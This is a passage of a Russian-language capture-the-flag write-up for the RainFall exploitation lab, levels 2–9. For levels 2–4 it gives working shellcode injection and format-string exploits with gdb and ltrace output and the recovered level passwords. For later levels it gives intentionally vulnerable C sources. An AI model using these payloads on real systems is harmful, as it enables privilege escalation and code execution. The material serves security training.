#    0x08048538 <+100>:   call   0x80483e0 <strdup@plt>
#    0x0804853d <+105>:   leave  
#    0x0804853e <+106>:   ret    
# End of assembler dump.
```

`0x080484ed <+25>:    call   0x80483c0 <gets@plt>` p содержит gets(), в то же время содержит защиту от переполнения буфера на случай перезаписи eip регистра (адреса возврата из фукнции) и использования вредоносного кода в стеке (shell-кода, адреса другой функции для взлома) и в переменных окружения (также видно из предыдущего уровня, что адрес начинается на 0xb...):
```
0x080484fb <+39>:    and    $0xb0000000,%eax           
0x08048500 <+44>:    cmp    $0xb0000000,%eax           

0x08048505 <+49>:    jne    0x8048527 <p+83>           
...                                                    
0x08048522 <+78>:    call   0x80483d0 <_exit@plt>      
```
<details> 
  <summary> В развороте, как узнать адрес стека и почему именно 0xb0000000 </summary>

`gdb level2`      <br>
`b *0x08048486`   <br>
`x/64wx $esp-20` <br>
эти три команды в дебагере выведут значения в стеке по конкретным адресам - все адреса на 0xb... начинаются, значит здесь нам не позволят вредоносный код в стеке выполнить.
</details>
<br>


Создается стековый фрейм (stack frame) или кадр стека:  \
`0x080484d4 <+0>:     push   %ebp     ` сохраняет в стеке содержимое регистра EBP \
`0x080484d5 <+1>:     mov    %esp,%ebp` присваивает регистру EBP значение ESP   

Далее:  \
`0x080484d7 <+3>:     sub    $0x68,%esp` резерв места для локальных переменных функции main 68<sub>16</sub> = 104<sub>10</sub>байт.

...

`0x080484ed <+25>:    call   0x80483c0 <gets@plt>` вызов функции, с помощью которой я переполню буфер

Защита от переполнения буфера на случай перезаписи eip регистра (адреса возврата из фукнции) и использования вредоносного кода в стеке (shell-кода, адреса другой функции для взлома) и в переменных окружения (адрес стека):
`0x080484fb <+39>:    and    $0xb0000000,%eax           ` \
`0x08048500 <+44>:    cmp    $0xb0000000,%eax           ` \
`0x08048505 <+49>:    jne    0x8048527 <p+83>           ` \
`...                                                    ` \
`0x08048522 <+78>:    call   0x80483d0 <_exit@plt>      `

Стек и env для вредоносного кода использовать не получится, зато можно использовать кучу:

Далее вызов `strdup()` с выделением памяти на куче. И не происходит освобождения памяти, возвращенной функцией `strdup()`, то есть в main вернется указатель на кучу, где и будет положен shellcode:
`0x08048538 <+100>:   call   0x80483e0 <strdup@plt> `
`0x0804853d <+105>:   leave                         `
`0x0804853e <+106>:   ret                           `

Посмотреть адрес, возвращенный strdup() можно 3 способами:

1. 
```sh
ltrace ./level2 
# ||
# \/
# __libc_start_main(0x804853f, 1, 0xbffff6f4, 0x8048550, 0x80485c0 <unfinished ...>
# fflush(0xb7fd1a20)                                                             = 0
# gets(0xbffff5fc, 0, 0, 0xb7e5ec73, 0x80482b5 12345678Hello
# )                                  = 0xbffff5fc
# puts(" 12345678Hello" 12345678Hello
# )                                                         = 15
# strdup(" 12345678Hello")                                                       = 0x0804a008
```
2. 
```sh
(gdb) disassemble  p
# ||
# \/
# Dump of assembler code for function p:
#    0x080484d4 <+0>:     push   %ebp
# ...
#    0x08048535 <+97>:    mov    %eax,(%esp)
#    0x08048538 <+100>:   call   0x80483e0 <strdup@plt>
#    0x0804853d <+105>:   leave  
#    0x0804853e <+106>:   ret    
# End of assembler dump.
(gdb) b *0x0804853d
(gdb) r
(gdb) info registers
# ||
# \/
# eax            0x804a008        134520840
# ...
# ...

```
3.
```sh
(gdb) disassemble main
# ||
# \/
# Dump of assembler code for function main:
#    0x0804853f <+0>:     push   %ebp
#    0x08048540 <+1>:     mov    %esp,%ebp
#    0x08048542 <+3>:     and    $0xfffffff0,%esp
#    0x08048545 <+6>:     call   0x80484d4 <p>
#    0x0804854a <+11>:    leave  
#    0x0804854b <+12>:    ret    
# End of assembler dump.
(gdb) b *0x0804854a
(gdb) r
(gdb) info registers
# ||
# \/
# eax            0x804a008        134520840
...
...


```
Адрес кучи `0x804a008` .

Узнаю смещение адреса возврата функции. Добиваю буфер до нужного размера переполнения (shellcode + NOP-срезы) + адрес кучи.

![Смещение:](./README/level2_buf_overflow.png)

В этом задании я буду использовать тот же shellcode, что и на предыдущем уровне ([shellcode из level1](#shellcode)).

```sh
# http://shell-storm.org/shellcode/files/shellcode-237.html
(echo $(python -c 'print "\x68\xcd\x80\x68\x68\xeb\xfc\x68\x6a\x0b\x58\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xeb\xe1" + "\x90" * 48 + "\x08\xa0\x04\x08"'); cat) | ./level2
# ||
# \/
# h̀hh��hj
#        X1�Rh//shh/bin��RS���ᐐ�����������������������������������������
whoami
# ||
# \/
# level3
cat /home/user/level3/.pass
# ||
# \/
# 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```
Уровень пройден!
```sh
su level3
# Password: 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```

<details> 
  <summary> Под этой строкой в развороте исходник и команда для компиляции: </summary>
<pre>

#include "stdlib.h"
#include "unistd.h"
#include "stdio.h"
#include "string.h"
<br>
char *p(void) {
        char            buffer[64];
        unsigned int    ret;

        printf(""); fflush(stdout);
        gets(buffer);
        ret = __builtin_return_address(0);
        if((ret & 0xb0000000) == 0xb0000000) {
                printf("(%p)\n", ret);
                _exit(1);
        }
        printf("%s\n", buffer);
        return strdup(buffer);
}
<br>
int  main(int argc, char **argv) {
        p();
}
</pre>
gcc -m32 -z execstack -Wl,-z,norelro -fno-stack-protector исходник_level2.c -o level2
</details> 


#
###### [вернуться к содержанию](#content)
<a name="lvl3"></a> 
# level3

<!-- <pre>
level0@RainFall:~$ su level3
<font color=grey>Password: 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02</font>

RELRO      STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
<font class=off>No RELRO   No canary found   NX disabled   No PIE</font>          <font class=on>No RPATH   No RUNPATH</font>   <font class=filePath>/home/user/level3/level3</font>
</pre> -->

![level3](./README/level3.png)

```sh

ls -la
# ||
# \/
# ...
# -rwsr-s---+ 1 level4 users  5366 Mar  6  2016 level3

./level3 
# ||
# \/
# 

./level3 12345
# ||
# \/
# 

./level3 
# 12345
# ||
# \/
# 12345

getfacl level3 
# ||
# \/
# # file: level3
# # owner: level4        !!!!!!!!!!!!!!!
# # group: users
# # flags: ss-
# user::rwx
# user:level3:r-x
# user:level4:r-x
# group::---
# mask::r-x
# other::---

ltrace ./level3 
# 12345
# ||
# \/
# __libc_start_main(0x804851a, 1, 0xbffff6f4, 0x8048530, 0x80485a0 <unfinished ...>
# fgets(12345
# "12345\n", 512, 0xb7fd1ac0)                                    = 0xbffff440
# printf("12345\n"12345
# )                                                    = 6
# +++ exited (status 0) +++


(gdb) disassemble 
# ||
# \/
# ...
# m
# main
# v
# fgets
# printf
# system
# fwrite                     
...

(gdb) disassemble m
# ||
# \/
# No function contains specified address.
```
Значит, `m` - это глобальная переменная <a name="lvl3_m"></a> 
```sh
(gdb) x &m
# ||
# \/
# 0x804988c <m>:  0x00000000

(gdb) disassemble main
# ||
# \/
# Dump of assembler code for function main:
#    0x0804851a <+0>:     push   %ebp
#    0x0804851b <+1>:     mov    %esp,%ebp
#    0x0804851d <+3>:     and    $0xfffffff0,%esp
#    0x08048520 <+6>:     call   0x80484a4 <v>
#    0x08048525 <+11>:    leave  
#    0x08048526 <+12>:    ret    
# End of assembler dump.
```
<details> 
  <summary> Анализ disassemble main в развороте: </summary>

___

создается стековый фрейм (stack frame) или кадр стека: \
`0x0804851a <+0>:     push   %ebp` сохраняет в стеке содержимое регистра EBP  \
`0x0804851b <+1>:     mov    %esp,%ebp` присваивает регистру EBP значение ESP \
`0x0804851d <+3>:     and    $0xfffffff0,%esp` выравнивание стека по 16-байтовой границе, то есть каждая созданная переменная и выделенная в функции main область памяти будет выравниваться до размера, кратного 16 байтам.

`0x08048520 <+6>:     call   0x80484a4 <v>` вызов функции `v()`

Далее завершение и возврат из функции `main()`: \
`0x08048525 <+11>:    leave ` \
`0x08048526 <+12>:    ret `   

Анализ disassemble main завершен.
___
</details> 

Из анализа видно, что в `main()` только вызов функции `v()` происходит.

Коротко о disassemble `v()`:

Внутри `v()` вызываются функции: \
`fgets`  \
`printf` \
`system` \
`fwrite` \
и глобальная переменная: \
`m`

`fgets()` защищенная функция, значит с ее помощью не удастся переполнить буфер.
Слабые места: `system()` и `printf()`.

Поиск уязвимости printf() в google.com: \
"printf уязвимость" -> ["Такой тип уязвимости называют атакой на строку форматирования (англ. Format string attack)"](https://ru.wikipedia.org/wiki/Printf).

Таким образом необходимо подать правильные аргументы для `printf()`, чтобы переместиться на `system()`.

<details> 
  <summary> Анализ disassemble v() в развороте: </summary>

___

1. создается стековый фрейм (stack frame) или кадр стека: \
`0x080484a4 <+0>:     push   %ebp` сохраняет в стеке содержимое регистра EBP  \
`0x080484a5 <+1>:     mov    %esp,%ebp` присваивает регистру EBP значение ESP \
`0x080484a7 <+3>:     sub    $0x218,%esp` выделяется 218<sub>16</sub> = 536<sub>10</sub> байт под локальные переменные.
```sh
# в gdb disassemble это выглядит так:
   0x080484a4 <+0>:     push   %ebp
   0x080484a5 <+1>:     mov    %esp,%ebp       x $ebp    -->    0xbffff628:     0xbffff638
                                               esp был 0xbffff628 (in esp 0xbffff638 - start v())
   0x080484a7 <+3>:     sub    $0x218,%esp     после "0x080484a7 <+3>" регистр "esp" стал 628-218 = 0xbffff410
```

2. Подготовка к вызову `char *fgets(char *str, int num, FILE *stream)`: 

`0x080484ad <+9>:     mov    0x8049860,%eax` в качестве `FILE *stream` в `fgets()` передано `0` (`stdin`).
```sh
(gdb) x *0x8049860
# ||
# \/
# 0xb7fd1ac0 <_IO_2_1_stdin_>:    0xfbad2088
```

`0x080484b2 <+14>:    mov    %eax,0x8(%esp)` кладу значение `stdin` в `0x8(%esp)` \
`0x080484b6 <+18>:    movl   $0x200,0x4(%esp)` кладу размер буфера 200<sub>16</sub> = 512<sub>10</sub> байт в `0x4(%esp)` \
`0x080484be <+26>:    lea    -0x208(%ebp),%eax` кладу в регистр `%eax` указатель на буфер в 512<sub>10</sub> байт и два вышеуказанных значения для передачи в `fgets()` \
`0x080484c4 <+32>:    mov    %eax,(%esp)` \
`0x080484c7 <+35>:    call   0x80483a0 <fgets@plt>` вызов функции `fgets()`

```sh
# в gdb disassemble стек выглядит так:    | stack:  
0x080484ad <+9>:  mov  0x8049860,%eax     | x $eax --> 0xb7fd1ac0 <_IO_2_1_stdin_>:  ||
                                          |            0xfbad2088                    \/
                                          |                                      x/64xw $esp
0x080484b2 <+14>: mov  %eax,0x8(%esp)     | 0xbffff410:  0xb7fde612  0xb7ffeff4  0xb7fd1ac0  0xb7ff37d0
                                          | 
                                          |                          x/64xw $esp
0x080484b6 <+18>: movl  $0x200,0x4(%esp)  | 0xbffff410:  0xb7fde612  0x00000200  0xb7fd1ac0  0xb7ff37d0
                                          | 
0x080484be <+26>: lea  -0x208(%ebp),%eax  | x $eax    -->    0xbffff420:  0x00000000
                                          | 
                                          |              x/64xw $esp
0x080484c4 <+32>: mov  %eax,(%esp)        | 0xbffff410:  0xbffff420  0x00000200  0xb7fd1ac0  0xb7ff37d0
                                          |                                                      |
(gdb) x 0xb7ff37d0       <------------------------------------------------------------------------
# ||                                      |
# \/                                      |
# 0xb7ff37d0 <__libc_memalign+16>: 0xb824c381
#                                         |                                                 выравнивание
# Выравнивание до 16 байт:                |                                                  до 16 байт
                                          | 0xbffff410:  0xbffff420  0x00000200  0xb7fd1ac0  0xb7ff37d0

0x080484c7 <+35>:    call   0x80483a0 <fgets@plt>     вызов fgets()
AAAA

возвращает AAAA в eax, а eax был на стеке <+32> в 0xbffff420:     0x41414141
``` 

3. Подготовка к вызову `printf()`:

`0x080484cc <+40>:    lea    -0x208(%ebp),%eax`      x $eax  ebp(628)-208=420  -->    0xbffff420:  0x41414141 \
                                                     буфер передается в качестве аргумента для printf()       \
`0x080484d2 <+46>:    mov    %eax,(%esp)` \
`0x080484d5 <+49>:    call   0x8048390 <printf@plt>` вызов функции `printf()`

4. 0x080484e2 <+62> сравнение `m` со значением 64:

Подготовка для сравнения:

`0x080484da <+54>:    mov    0x804988c,%eax` положили значение глобальной переменной (это 0) в регистр `eax`
```sh
(gdb) x 0x804988c
# ||
# \/
# 0x804988c <m>:  0x00000000
```
`0x080484df <+59>:    cmp    $0x40,%eax` сравниваем `m` и `40`<sub>16</sub>=`64`<sub>10</sub>`
`0x080484e2 <+62>:    jne    0x8048518 ` если `m` не равно `64`, то переходим к `0x08048518 <+116>:   leave` - это завершение функцию `v()`, потом `main()` и выход из программы.

Если же значение совпали, то в дальнейшем будет произведены подготовка (`0x0804850c <+104>`) и вызов `system()` (`0x08048513 <+111>`):

Анализ disassemble v() завершен.
___

</details> 

Уязвимость `printf()`: 
1. Защищенное использование функции: `printf("%s", string);` 
2. [Уязвимое использование функции](https://habr.com/ru/company/pvs-studio/blog/137411/): `printf(string);`

Из пункта 3 "Подготовка к вызову `printf()`" в вышеприведенном анализе disassemble v() видно, что в функцию передан буфер - уязвимое использование функции.

Также есть еще способ, как проверить `printf()` на уязвимость через терминал:
```sh
echo "%p %p %p" | ./level3 
# ||
# \/
# 0x200 0xb7fd1ac0 0xb7ff37d0
```

Значит, при написании программы использовался уязвимый вариант `printf()`.

```sh
echo "AAAA %p %p %p %p %p %p %p %p " | ./level3 
# ||
# \/
#  ____________________________________
# ||                                  ||
# \/                                  \/
# AAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520 0x25207025 0x70252070 0x20702520 
```
Вместо `AAAA` подставляю адрес глобальной переменной `m` ([выше я его узнала с помощью дебаггера](#lvl3_m)) `\x8c\x98\x04\x08`
```sh
echo -e "\x8c\x98\x04\x08 %p %p %p %p " | ./level3 
# ||
# \/
# �                200 0xb7fd1ac0 0xb7ff37d0 0x804988c 
# \x8c\x98\x04\x08  %p      %p        %p        %p 
#                    1       2         3         4
# наша глобальная переменная m под номером 4. Значит %4$n
```

Здесь я быстро добралась до нужной памяти. Но иногда нужное значение может быть очень далеко. Тогда можно использовать команду:
```sh
echo -e $(python -c 'print "AAAA" + " %p" * 1000') | ./level3 | tr " " "\n" | grep -n 0x41414141
    5  0x41414141

# tr " " "\n"     разделит строку по пробелам и каждое следующее значение стека перенесет на новую строку
# grep -n 0x41414141 отфильтрует нужную строку с указанием ее номера

# Поскольку нумерация начинается с AAAA (это будет первая выведенная строка), а печать стека начинается со второй строки, 
# необходимо вычесть 1         (5-1= 4  0x41414141)
# наша глобальная переменная m под номером 4. Значит %4$n
```
Теперь с [помощью модификатора](https://www.opennet.ru/man.shtml?topic=printf&category=3&russian=0) `%n` перезаписываю значение `m`:
1. Адрес `m` занимает 4 байта
2. Заполню оставшиеся 64-4 = 60 байт любым символом `A`

```sh
#                           адрес m       заполнитель    позиция введенного
#                           4 байта         60 байт      адреса в стеке
(echo $(python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"'); cat) | ./level3
# ||
# \/
# �AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Wait what?!
cat /home/user/level4/.pass
# ||
# \/
# b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa

#                         Можно так заполнить: вместо A
# (echo $(python -c 'print "\x8c\x98\x04\x08" + "%60d" + "%4$n"'); cat) | ./level3

```
Уровень пройден!
```sh
su level4
# Password: b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```


<details> 
  <summary> Под этой строкой в развороте исходник и команда для компиляции: </summary>
<pre>

#include "stdlib.h"
#include "unistd.h"
#include "stdio.h"
#include "string.h"

int m;

void  v(void) {

    char b[512];

    fgets(b, sizeof(b), stdin);
    printf(b);
    if(m == 64) {
            fprintf(stdout ,"Wait what?!\n");
            system("/bin/sh");
    }
}

int   main(int argc, char **argv) {

    v();
}

</pre>
gcc -m32 -z execstack -Wl,-z,norelro -fno-stack-protector исходник_level.c -o level
</details> 

#
###### [вернуться к содержанию](#content)
<a name="lvl4"></a> 
# level4

<!-- <pre>
level0@RainFall:~$ su level4
<font color=grey>Password: b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa</font>

RELRO      STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
<font class=off>No RELRO   No canary found   NX disabled   No PIE</font>          <font class=on>No RPATH   No RUNPATH</font>   <font class=filePath>/home/user/level4/level4</font>
</pre> -->

![level4](./README/level4.png)

```sh
ls -la
# ||
# \/
# -rwsr-s---+ 1 level5 users  5252 Mar  6  2016 level4
# ...

getfacl level4 
# ||
# \/
# owner: level5
# flags: ss-

ltrace ./level4 
# ||
# \/
# __libc_start_main(0x80484a7, 1, 0xbffff6f4, 0x80484c0, 0x8048530 <unfinished ...>
# fgets(AAAA
# "AAAA\n", 512, 0xb7fd1ac0)                                     = 0xbffff440
# printf("AAAA\n"AAAA
# )                                                     = 5
# +++ exited (status 0) +++

gdb level4
(gdb) disassemble main
# ||
# \/
# Dump of assembler code for function main:
#    0x080484a7 <+0>:     push   %ebp
#    0x080484a8 <+1>:     mov    %esp,%ebp
#    0x080484aa <+3>:     and    $0xfffffff0,%esp
#    0x080484ad <+6>:     call   0x8048457 <n>
#    0x080484b2 <+11>:    leave  
#    0x080484b3 <+12>:    ret    
# End of assembler dump.


```
<details> 
  <summary> Анализ disassemble main в развороте: </summary>

___

создается стековый фрейм (stack frame) или кадр стека: \
`0x080484a7 <+0>:     push   %ebp` сохраняет в стеке содержимое регистра EBP  \
`0x080484a8 <+1>:     mov    %esp,%ebp` присваивает регистру EBP значение ESP \
`0x080484aa <+3>:     and    $0xfffffff0,%esp` выравнивание стека по 16-байтовой границе, то есть каждая созданная переменная и выделенная в функции main область памяти будет выравниваться до размера, кратного 16 байтам.

`0x080484ad <+6>:     call   0x8048457 <n>` вызов функции `n()`

Далее завершение и возврат из функции `main()`: \
`0x080484b2 <+11>:    leave ` \
`0x080484b3 <+12>:    ret `   

Анализ disassemble main завершен.
___
</details> 

Из анализа видно, что в `main()` только вызов функции `n()` происходит.

Коротко о disassemble `n()`:

Внутри `n()` вызываются функции: \
`fgets`  \
`p`      \
`system` 

и глобальная переменная: \
`m`

`fgets()` защищенная функция, значит с ее помощью не удастся переполнить буфер.
Слабые места: `system()` и `printf()` (ниже будет видно - внутри функции `p()`).

<details> 
  <summary> Анализ disassemble n() в развороте: </summary>


```sh
(gdb) disassemble n
# Dump of assembler code for function n:
#    0x08048457 <+0>:     push   %ebp
#    0x08048458 <+1>:     mov    %esp,%ebp
#    0x0804845a <+3>:     sub    $0x218,%esp
#    0x08048460 <+9>:     mov    0x8049804,%eax
#    0x08048465 <+14>:    mov    %eax,0x8(%esp)
#    0x08048469 <+18>:    movl   $0x200,0x4(%esp)
#    0x08048471 <+26>:    lea    -0x208(%ebp),%eax
#    0x08048477 <+32>:    mov    %eax,(%esp)
#    0x0804847a <+35>:    call   0x8048350 <fgets@plt>
#    0x0804847f <+40>:    lea    -0x208(%ebp),%eax
#    0x08048485 <+46>:    mov    %eax,(%esp)
#    0x08048488 <+49>:    call   0x8048444 <p>
#    0x0804848d <+54>:    mov    0x8049810,%eax
#    0x08048492 <+59>:    cmp    $0x1025544,%eax
#    0x08048497 <+64>:    jne    0x80484a5 <n+78>
#    0x08048499 <+66>:    movl   $0x8048590,(%esp)
#    0x080484a0 <+73>:    call   0x8048360 <system@plt>
#    0x080484a5 <+78>:    leave  
#    0x080484a6 <+79>:    ret    
# End of assembler dump.
```
___

1. создается стековый фрейм (stack frame) или кадр стека: \
`0x08048457 <+0>:     push   %ebp` сохраняет в стеке содержимое регистра EBP  \
`0x08048458 <+1>:     mov    %esp,%ebp` присваивает регистру EBP значение ESP \
`0x0804845a <+3>:     sub    $0x218,%esp` выделяется 218<sub>16</sub> = 536<sub>10</sub> байт под локальные переменные (в том числе как было видно при вызове `ltrace ./level4` 512 байт под буфер для `fgets()`).
```sh
# в gdb disassemble это выглядит так:
   0x080484a4 <+0>:     push   %ebp
   0x080484a5 <+1>:     mov    %esp,%ebp       x $ebp    -->    0xbffff628:     0xbffff638
                                               esp был 0xbffff628 (in esp 0xbffff638 - start v())
   0x080484a7 <+3>:     sub    $0x218,%esp     после "0x080484a7 <+3>" регистр "esp" стал 628-218 = 0xbffff410
```

2. Подготовка к вызову `char *fgets(char *str, int num, FILE *stream)`: 

`0x08048460 <+9>:     mov    0x8049804,%eax` в качестве `FILE *stream` в `fgets()` передано `0` (`stdin`).
```sh
(gdb) x 0x8049804
# ||
# \/
# 0x8049804 <stdin@@GLIBC_2.0>:   0x00000000
```

`0x08048465 <+14>:    mov    %eax,0x8(%esp)` кладу значение `stdin` в `0x8(%esp)` \
`0x08048469 <+18>:    movl   $0x200,0x4(%esp)` кладу размер буфера 200<sub>16</sub> = 512<sub>10</sub> байт в `0x4(%esp)` \
`0x08048471 <+26>:    lea    -0x208(%ebp),%eax` кладу в регистр `%eax` указатель на буфер в 512<sub>10</sub> байт и два вышеуказанных значения для передачи в `fgets()` \
`0x08048477 <+32>:    mov    %eax,(%esp)` \
`0x0804847a <+35>:    call   0x8048350 <fgets@plt>` вызов функции `fgets()`


3. Подготовка к вызову `p()` внутри которой `printf()`:

`0x0804847f <+40>:    lea    -0x208(%ebp),%eax`   буфер передается в качестве аргумента для printf() \
`0x08048485 <+46>:    mov    %eax,(%esp)` \
`0x08048488 <+49>:    call   0x8048444 <p>` вызов функции `p`

4. 0x08048492 <+59> сравнение `m` со значением $0x1025544:

Подготовка для сравнения:

`0x0804848d <+54>:    mov    0x8049810,%eax` положили значение глобальной переменной (это 0) в регистр `eax`

```sh
(gdb) x 0x8049810
# ||
# \/
0x8049810 <m>:  0x00000000
```
`0x08048492 <+59>:    cmp    $0x1025544,%eax` сравниваем `m` и `1025544`<sub>16</sub>=`16930116`<sub>10</sub> \
`0x08048497 <+64>:    jne    0x80484a5 <n+78> ` если `m` не равно `16930116`, то переходим к `0x080484a5 <+78>:   leave` - это завершение функцию `n()`, потом `main()` и выход из программы.

Если же значение совпали, то в дальнейшем будет произведены подготовка (`0x08048499 <+66>:    movl   $0x8048590,(%esp)` ) и вызов `system()` (`0x080484a0 <+73>:`):


Анализ disassemble n() завершен.
___

</details> 

Из анализа видно, что внутри n() вызывается `fgets()`, \
при ее вызове введенная строка передается `p()`, `p()` (ниже в анализе `p()` будет видно, что эта функция с этой строкой вызывает `printf()` уязвимым способом) ничего не возвращает, \
далее сравнивается значение `m` с числом `16930116`, \
при совпадении вызывается функция `system()`.

<details> 
  <summary> Анализ disassemble p() в развороте: </summary>

___
```sh
(gdb) disass p
# ||
# \/
# Dump of assembler code for function p:
#    0x08048444 <+0>:     push   %ebp            сохраняет в стеке содержимое регистра EBP
#    0x08048445 <+1>:     mov    %esp,%ebp       присваивает регистру EBP значение ESP
#    0x08048447 <+3>:     sub    $0x18,%esp      выделено место под локальные переменные
#    0x0804844a <+6>:     mov    0x8(%ebp),%eax  аргументом для printf() будет передана строка, которую при вызове приняла p() в качестве аргумента
#    0x0804844d <+9>:     mov    %eax,(%esp)
#    0x08048450 <+12>:    call   0x8048340 <printf@plt> вызов print()
#    0x08048455 <+17>:    leave                  завершение p()
#    0x08048456 <+18>:    ret    
# End of assembler dump.
```

`p()` вызывает только `printf()` уязвимым способом - в качестве аргумента передается только буфер (ранее введенная строка).

Анализ disassemble p() завершен.
___

</details> 

Поиск уязвимости printf() в google.com: \
"printf уязвимость" -> ["Такой тип уязвимости называют атакой на строку форматирования (англ. Format string attack)"](https://ru.wikipedia.org/wiki/Printf).

Таким образом необходимо подать правильные аргументы для `printf()`, чтобы переместиться на `system()`.

Аналогично `level3`  буду использовать модификатор %n и для получения положения нужной переменной для изменения ее значения воспользуюсь командой:
```sh
echo -e $(python -c 'print "AAAA" + " %p" * 1000') | ./level4 | tr " " "\n" | grep -n 0x41414141
13:0x41414141

# tr " " "\n"     разделит строку по пробелам и каждое следующее значение стека перенесет на новую строку
# grep -n 0x41414141 отфильтрует нужную строку с указанием ее номера

# Поскольку нумерация начинается с AAAA (это будет первая выведенная строка), а печать стека начинается со второй строки, 
# необходимо вычесть 1               (13-1= 12  0x41414141)
# наша глобальная переменная m под номером  12. Значит %12$n
```
Теперь с [помощью модификатора](https://www.opennet.ru/man.shtml?topic=printf&category=3&russian=0) `%n` перезаписываю значение `m`:
1. Адрес `m` занимает 4 байта
2. Аналогично level3 необходимо заполнить оставшиеся 16930116-4 = 16930112 байт каким-то символом,
но способ как в level3 не сработает - слишком огромная строка передавалась бы. Чтобы не передавать строку извне, можно задать длинную строку изнутри `printf()` - всего лишь задать ширину поля 16930112.
3. Запускаю:

```sh
#                           адрес m         заполнитель     позиция введенного
#                           4 байта         16930112 байт   адреса в стеке
echo $(python -c 'print "\x10\x98\x04\x08" + "%16930112d" + "%12$n"') | ./level4
# ||
# \/
# -1208015184
# 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```
Уровень пройден!
```sh
su level5
# Password: 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```

<details> 
  <summary> Под этой строкой в развороте исходник и команда для компиляции: </summary>
<pre>

#include "stdlib.h"
#include "unistd.h"
#include "stdio.h"
#include "string.h"
#define FILE_PASS "/bin/cat /home/user/level5/.pass"

int m;

void  p(char *string) {

    printf(string);

}

void  n(void) {

    char  b[512];

    fgets(b, sizeof(b), stdin);
    p(b);
    if(m == 0x01025544) {

            system(FILE_PASS);

    }

}

int main(int argc, char **argv) {

    n();

}

</pre>
gcc -m32 -z execstack -Wl,-z,norelro -fno-stack-protector исходник_level.c -o level
</details> 

#
###### [вернуться к содержанию](#content)
<a name="lvl5"></a> 
# level5

<!-- <pre>
level0@RainFall:~$ su level5
<font color=grey>Password: 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a</font>

RELRO      STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
<font class=off>No RELRO   No canary found   NX disabled   No PIE</font>          <font class=on>No RPATH   No RUNPATH</font>   <font class=filePath>/home/user/level5/level5</font>
</pre> -->

![level5](./README/level5.png)

<details> 
  <summary> Под этой строкой в развороте исходник и команда для компиляции: </summary>
<pre>

#include "stdlib.h"
#include "unistd.h"
#include "stdio.h"
#include "string.h"

int m;

void  o(void) {

    system("/bin/sh");
    _exit(1);

}

void  n(void){

    char b[512];

    fgets(b, sizeof(b), stdin);
    printf(b);
    exit(1);   

}

int main(int argc, char **argv) {

    n();

}

</pre>
gcc -m32 -z execstack -Wl,-z,norelro -fno-stack-protector исходник_level.c -o level
</details> 

#
###### [вернуться к содержанию](#content)
<a name="lvl6"></a> 
# level6

<details> 
  <summary> Под этой строкой в развороте исходник и команда для компиляции: </summary>
<pre>

#include "stdlib.h"
#include "unistd.h"
#include "string.h"
#include "stdio.h"
#include "sys/types.h"

#define FILE_PASS "/bin/cat /home/user/level7/.pass"

struct data {

    char name[64];

};

struct fp {

    int (*fp)();

};

void n (void) {

    system(FILE_PASS);

}

void m(void) {

    printf("Nope\n");

}

int main(int argc, char **argv) {

    struct data *d;
    struct fp *f;

    d = malloc(sizeof(struct data));
    f = malloc(sizeof(struct fp));
    f->fp = m;
    strcpy(d->name, argv[1]);
    f->fp();

}

</pre>
gcc -m32 -z execstack -Wl,-z,norelro -fno-stack-protector исходник_level.c -o level
</details> 

#
###### [вернуться к содержанию](#content)
<a name="lvl7"></a> 
# level7

<details> 
  <summary> Под этой строкой в развороте исходник и команда для компиляции: </summary>
<pre>

#include "stdlib.h"
#include "unistd.h"
#include "string.h"
#include "stdio.h"
#include "sys/types.h"
#include "sys/stat.h"
#include "fcntl.h"

char c[80];

struct internet {

    int priority;
    char *name;

};

void m(void) {

    printf("%s - %d\n", c, time(NULL));

}

int main(int argc, char **argv) {

    struct internet *i1, *i2, *i3;

    i1 = malloc(sizeof(struct internet));
    i1->priority = 1;
    i1->name = malloc(8);

    i2 = malloc(sizeof(struct internet));
    i2->priority = 2;
    i2->name = malloc(8);

    strcpy(i1->name, argv[1]);
    strcpy(i2->name, argv[2]);
    fgets(c, 68, fopen("/home/user/level8/.pass", "r"));

    printf("~~\n");
    return (0);

}

</pre>
gcc -m32 -z execstack -Wl,-z,norelro -fno-stack-protector исходник_level.c -o level
</details> 

#
###### [вернуться к содержанию](#content)
<a name="lvl8"></a> 
# level8

<details> 
  <summary> Под этой строкой в развороте исходник и команда для компиляции: </summary>
<pre>

#include "stdlib.h"
#include "unistd.h"
#include "string.h"
#include "sys/types.h"
#include "stdio.h"

struct auth {

    char name[32];
    int auth;

};

struct auth *auth;
char        *service;

int main(int argc, char **argv) {

    char  line[128];

    while(42) {

        printf("%p, %p \n", auth, service);

        if(fgets(line, sizeof(line), stdin) == NULL) break;

        if(strncmp(line, "auth ", 5) == 0) {

                auth = malloc(sizeof(auth));
                memset(auth, 0, sizeof(auth));
                if(strlen(line + 5) < 31) {

                        strcpy(auth->name, line + 5);

                }

        }

        if(strncmp(line, "reset", 5) == 0) {

                free(auth);

        }

        if(strncmp(line, "service", 6) == 0) {

                service = strdup(line + 7);

        }

        if(strncmp(line, "login", 5) == 0) {

                if(auth->auth) {

                        system("/bin/sh");

                } else {

                        fprintf(stdout, "Password:\n");

                }

        }

    }

    return 0;

}

</pre>
gcc -m32 -z execstack -Wl,-z,norelro -fno-stack-protector исходник_level.c -o level
</details> 

#
###### [вернуться к содержанию](#content)
<a name="lvl9"></a> 
# level9

<details> 
  <summary> Под этой строкой в развороте исходник и команда для компиляции: </summary>
<pre>

#include "iostream"
#include "cstring"
 
class N {

public:

